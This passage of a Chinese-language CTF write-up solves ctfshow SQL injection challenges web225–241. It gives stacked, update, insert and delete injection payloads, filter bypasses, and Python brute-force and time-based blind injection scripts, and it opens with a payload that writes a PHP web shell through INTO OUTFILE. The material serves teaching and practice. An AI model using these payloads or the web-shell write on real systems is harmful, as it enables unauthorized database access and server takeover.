<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filetype</span> = (<span class="keyword">new</span> finfo)-&gt;<span class="title function_ invoke__">file</span>(<span class="string">&#x27;1.txt&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$filetype</span>);</span><br></pre></td></tr></table></figure>

<p>然后我们创建一个1.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C64File &quot;&#x27;);select 0x3c3f3d60746163202f666c2a603f3e into outfile &#x27;/var/www/html/file1.php&#x27;;--+</span><br></pre></td></tr></table></figure>

<p>运行php后执行结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(107) &quot;PC64 Emulator file &quot;&quot;&#x27;);select 0x3c3f3d60746163202f666c2a603f3e into outfile &#x27;/var/www/html/file1.php&#x27;;--+&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>可以发现这里成功插入了我们的数据，也就是说我们代码中的filetype，然后这里拼接到sql语句中造成注入</p>
<h3 id="堆叠注入提升"><a href="#堆叠注入提升" class="headerlink" title="堆叠注入提升"></a>堆叠注入提升</h3><h3 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h3><p>查询语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>返回逻辑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的话过滤了很多啊，但是show可以用，试着看一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/api/?username=-1&#x27;;show databases;--+</span><br><span class="line">/api/?username=-1&#x27;;show tables;--+</span><br><span class="line">/api/?username=-1&#x27;;show tables;show columns from ctfshow_web.ctfshow_flagasa;--+</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&quot;:[&#123;&quot;Tables_in_ctfshow_web&quot;:&quot;ctfshow_flagasa&quot;&#125;,&#123;&quot;Tables_in_ctfshow_web&quot;:&quot;ctfshow_user&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>出来表名了，但是操作表的函数都被禁了，翻了一下可以用handler</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=-1&#x27;;handler `ctfshow_flagasa` open;handler `ctfshow_flagasa` read first;--+</span><br></pre></td></tr></table></figure>

<p>这个表只有一行数据，直接就出来了</p>
<h3 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了show和(，上面的方法不能用了，但是可以用预处理语句</p>
<p>这里因为过滤了查询语句，所以用十六进制编码绕过</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?username=-1&#x27;;PREPARE test from 0x73686f7720646174616261736573;execute test;--+</span><br><span class="line">ctfshow_web</span><br><span class="line"></span><br><span class="line">?username=-1&#x27;;PREPARE test from 0x73686f77207461626c6573;execute test;--+</span><br><span class="line">ctfsh_ow_flagas</span><br><span class="line"></span><br><span class="line">?username=-1&#x27;;PREPARE test from 0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173;execute test;--+</span><br><span class="line">data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;flagasb&quot;:&quot;ctfshow&#123;f48205fc-3fcc-42c3-9ca7-bb5ee5018ded&#125;&quot;,&quot;info&quot;:&quot;you get it&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//师傅说过滤的越多越好</span><br><span class="line"> if(preg_match(&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i&#x27;,$username))&#123;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>比之前多了一个db和逗号，但是貌似不影响我们的操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username=-1&#x27;;PREPARE test from 0x73686f7720646174616261736573;execute test;--+</span><br><span class="line">ctfshow_web</span><br></pre></td></tr></table></figure>

<p>但是貌似flag不在表中，翻了一阵子都没翻到，那就看看存储过程</p>
<p><code>Routines</code> 是information_schema中的一个表，存储所有存储过程和函数的定义信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=-1&#x27;;PREPARE test from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;execute test;--+</span><br></pre></td></tr></table></figure>

<h3 id="web228-230"><a href="#web228-230" class="headerlink" title="web228-230"></a>web228-230</h3><p>这里看不到过滤了，但是之前的方法也能用</p>
<p>这里放出web228的payload，其他的改一下表名就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?username=-1&#x27;;PREPARE test from 0x73686f7720646174616261736573;execute test;--+</span><br><span class="line"></span><br><span class="line">?username=-1&#x27;;PREPARE test from 0x73686f77207461626c6573;execute test;--+</span><br><span class="line"></span><br><span class="line">?username=-1&#x27;;PREPARE test from 0x73656c656374202a2066726f6d2063746673685f6f775f666c616761736161;execute test;--+</span><br></pre></td></tr></table></figure>

<h2 id="update-注入"><a href="#update-注入" class="headerlink" title="update 注入"></a>update 注入</h2><h3 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;update ctfshow_user set pass = &#x27;&#123;$password&#125;&#x27; where username = &#x27;&#123;$username&#125;&#x27;;&quot;;</span><br></pre></td></tr></table></figure>

<p>更新一条数据，参数可控，这里的话可以直接注入username，让username的内容更新为我们的sql查询语句的结果</p>
<p>一直以为是GET传参，结果发现是post</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">password=ctfshow&#x27;,username=(select database())%23&amp;username=nonono</span><br><span class="line">数据库名：ctfshow_web</span><br><span class="line"></span><br><span class="line">password=ctfshow&#x27;,username=(select group_concat(table_name)from information_schema.tables where table_schema=database())%23&amp;username=nonono</span><br><span class="line">数据表名：banlist,ctfshow_user,flaga</span><br><span class="line"></span><br><span class="line">password=ctfshow&#x27;,username=(select group_concat(column_name)from information_schema.columns where table_name=&#x27;flaga&#x27;)%23&amp;username=nonono</span><br><span class="line">字段名：id,flagas,info</span><br><span class="line"></span><br><span class="line">password=ctfshow&#x27;,username=(select flagas from flaga)%23&amp;username=nonono</span><br></pre></td></tr></table></figure>

<h3 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;update ctfshow_user set pass = md5(&#x27;&#123;$password&#125;&#x27;) where username = &#x27;&#123;$username&#125;&#x27;;&quot;;</span><br></pre></td></tr></table></figure>

<p>有md5加密函数，闭合就完事</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">password=1&#x27;),username=(select database())--+&amp;username=test</span><br><span class="line">数据库名：ctfshow_web</span><br><span class="line"></span><br><span class="line">password=1&#x27;),username=(select group_concat(table_name)from information_schema.tables where table_schema=database())--+&amp;username=test</span><br><span class="line">数据表名：banlist,ctfshow_user,flagaa</span><br><span class="line"></span><br><span class="line">password=1&#x27;),username=(select group_concat(column_name)from information_schema.columns where table_name=&#x27;flagaa&#x27;)--+&amp;username=test</span><br><span class="line">字段名：id,flagass,info</span><br><span class="line"></span><br><span class="line">password=1&#x27;),username=(select flagass from flagaa)--+&amp;username=test</span><br></pre></td></tr></table></figure>

<h3 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;&#123;$username&#125;&#x27;;&quot;;</span><br></pre></td></tr></table></figure>

<p>过滤了单引号，直接转义逃逸单引号就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select database())--+</span><br><span class="line">数据库名：ctfshow_web</span><br><span class="line"></span><br><span class="line">password=\&amp;username=,username=(select group_concat(table_name)from information_schema.tables where table_schema=database())--+</span><br><span class="line">数据表名：banlist,ctfshow_user,flag233333</span><br><span class="line"></span><br><span class="line">password=\&amp;username=,username=(select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag233333&#x27;)--+</span><br><span class="line">字段名：id,flagass233,info</span><br><span class="line"></span><br><span class="line">password=\&amp;username=,username=(select flagass233 from flag233333)--+</span><br></pre></td></tr></table></figure>

<p>我发现过滤单引号只是在password中的，username中用单引号不影响</p>
<h3 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h3><p>这里连username的单引号也过滤了，不过也可以用双引号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select group_concat(column_name)from information_schema.columns where table_name=&quot;flag23a&quot;)--+</span><br><span class="line">字段名：id,flagass23s3,info</span><br><span class="line"></span><br><span class="line">password=\&amp;username=,username=(select flagass23s3 from flag23a)--+</span><br></pre></td></tr></table></figure>

<h3 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h3><p>过滤了or和单引号，这样的话information_schema库就用不了了，打无列名注入</p>
<p>用mysql的innodb_index_stats表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select group_concat(database_name) from mysql.innodb_index_stats)--+</span><br><span class="line">库名：忘记了没看到</span><br><span class="line"></span><br><span class="line">password=\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())--+</span><br><span class="line">表名：banlist,ctfshow_user,flag23a1</span><br></pre></td></tr></table></figure>

<p>然后用union取别名爆数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)--+</span><br></pre></td></tr></table></figure>

<p>这里需要limit限制输出，不然结果出不来</p>
<h3 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h3><p>多过滤了flag，先看看表名是什么</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())--+</span><br><span class="line">banlist,ctfshow_user,flaga</span><br></pre></td></tr></table></figure>

<p>但是好像在username中没有禁用flag，只是在password中禁用了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,1)a)--+</span><br></pre></td></tr></table></figure>

<h2 id="insert-注入"><a href="#insert-注入" class="headerlink" title="insert 注入"></a>insert 注入</h2><h3 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;insert into ctfshow_user(username,pass) value(&#x27;&#123;$username&#125;&#x27;,&#x27;&#123;$password&#125;&#x27;);&quot;;</span><br></pre></td></tr></table></figure>

<p>这里还是一样的，不过需要结束前面的insert语句</p>
<p>记得需要闭合后面的括号</p>
<p>在添加里面传入payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;,(select database()));#&amp;password=</span><br></pre></td></tr></table></figure>

<p>插入语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;insert into ctfshow_user(username,pass) value(&#x27;1&#x27;,(select database()));#&#x27;,&#x27;&#x27;);&quot;;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;,(select group_concat(schema_name) from information_schema.schemata))#&amp;password=1</span><br><span class="line">库名：ctfshow_web</span><br><span class="line"></span><br><span class="line">username=2&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&amp;password=1</span><br><span class="line">表名：banlist,ctfshow_user,flag</span><br><span class="line"></span><br><span class="line">username=3&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;))#&amp;password=1</span><br><span class="line">字段名：id,flagass23s3,info</span><br><span class="line"></span><br><span class="line">username=4&#x27;,(select flagass23s3 from flag))#&amp;password=1</span><br></pre></td></tr></table></figure>

<p>需要注意的是，insert只是插入数据的，不能覆盖数据，所以我们每次注入的结果得重新构造username的名字才能进行下一次插入</p>
<h3 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h3><p>过滤了空格，用空格绕过就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;,(select(database())))#&amp;password=1</span><br><span class="line">库名：ctfshow_web</span><br><span class="line"></span><br><span class="line">username=2&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))#&amp;password=1</span><br><span class="line">表名：banlist,ctfshow_user,flagb</span><br><span class="line"></span><br><span class="line">username=3&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flagb&#x27;)))#&amp;password=1</span><br><span class="line">字段名：id,flagass23s3,info</span><br><span class="line"></span><br><span class="line">username=4&#x27;,(select(flag)from(flagb)))#&amp;password=1</span><br></pre></td></tr></table></figure>

<h3 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤空格 or </span><br></pre></td></tr></table></figure>

<p>一样的，用其他的库去爆</p>
<p>库名还是ctfshow_web</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=2&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=1</span><br><span class="line">表名：banlist,ctfshow_user,flagbb</span><br></pre></td></tr></table></figure>

<p>然后union取别名爆字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=3&#x27;,(select(b)from(select(1),(2)as(b),(3)union(select(flagbb)limit(0),(1)))a))#&amp;password=1</span><br></pre></td></tr></table></figure>

<p>好奇怪取别名打不通，直接爆flag试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=3&#x27;,(select(group_concat(flag))from(ctfshow_web.flagbb)))#&amp;password=1</span><br></pre></td></tr></table></figure>

<h3 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤空格 or sys mysql</span><br></pre></td></tr></table></figure>

<p>断绝路了，那就直接爆表名吧，根据题目hint</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写</span><br></pre></td></tr></table></figure>

<p>写个脚本输出全部的组合</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_all_ab_combinations</span>(<span class="params">length=<span class="number">5</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成由 &#x27;a&#x27; 和 &#x27;b&#x27; 组成的所有可能组合的字符串。</span></span><br><span class="line"><span class="string">    :param length: 字符串的长度，默认为 5</span></span><br><span class="line"><span class="string">    :return: 所有组合的列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成所有可能的组合</span></span><br><span class="line">    combinations = [<span class="string">&#x27;&#x27;</span>.join(comb) <span class="keyword">for</span> comb <span class="keyword">in</span> product(<span class="string">&#x27;ab&#x27;</span>, repeat=length)]</span><br><span class="line">    <span class="keyword">return</span> combinations</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成所有五位组合</span></span><br><span class="line">all_combinations = generate_all_ab_combinations()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将结果写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;for5.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> comb <span class="keyword">in</span> all_combinations:</span><br><span class="line">        file.write(comb + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;所有组合已写入文件 &#x27;for5.txt&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://66eef819-a9cc-4007-8627-a7cdabdbc269.challenge.ctf.show/api/insert.php&quot;</span></span><br><span class="line">content = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;for5.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        content = line.strip()</span><br><span class="line">        payload = <span class="string">f&quot;flag<span class="subst">&#123;content&#125;</span>&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span> : <span class="string">f&quot;1&#x27;,(select(flag)from(<span class="subst">&#123;payload&#125;</span>)))#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        r = requests.post(url=url, data=data)</span><br></pre></td></tr></table></figure>

<p>当然也可以直接打</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#by baozongwi</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://66eef819-a9cc-4007-8627-a7cdabdbc269.challenge.ctf.show/api/insert.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a1 <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> a2 <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>:</span><br><span class="line">        <span class="keyword">for</span> a3 <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>:</span><br><span class="line">            <span class="keyword">for</span> a4 <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>:</span><br><span class="line">                <span class="keyword">for</span> a5 <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>:</span><br><span class="line">                    payload=<span class="string">&#x27;flag&#x27;</span>+a1+a2+a3+a4+a5</span><br><span class="line">                    data=&#123;</span><br><span class="line">                        <span class="string">&#x27;username&#x27;</span>:<span class="string">f&quot;1&#x27;,(select(flag)from(<span class="subst">&#123;payload&#125;</span>)))#&quot;</span>,</span><br><span class="line">                        <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    r=requests.post(url=url,data=data)</span><br></pre></td></tr></table></figure>

<p>最后刷新一下页面看看添加的结果就行</p>
<h2 id="delete-注入"><a href="#delete-注入" class="headerlink" title="delete 注入"></a>delete 注入</h2><h3 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//删除记录</span><br><span class="line">  $sql = &quot;delete from  ctfshow_user where id = &#123;$id&#125;&quot;;</span><br></pre></td></tr></table></figure>

<p>路由是&#x2F;api&#x2F;delete.php，POST参数的id</p>
<p>因为delete本身不会返回结果，所以我们打时间盲注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=sleep(0.15)</span><br></pre></td></tr></table></figure>

<p>延迟差不多3s左右，直接写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4450a879-5ff0-4c75-b503-1f6341f95494.challenge.ctf.show/api/delete.php&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#payload = f&quot;if(ascii(substr((select database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.15),0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.15),0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.15),0)#&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select flag from flag),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.15),0)#&quot;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span> : payload,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">        start = time.time()</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        end = time.time() - start</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> end &gt; <span class="number">2</span> :</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span> :</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

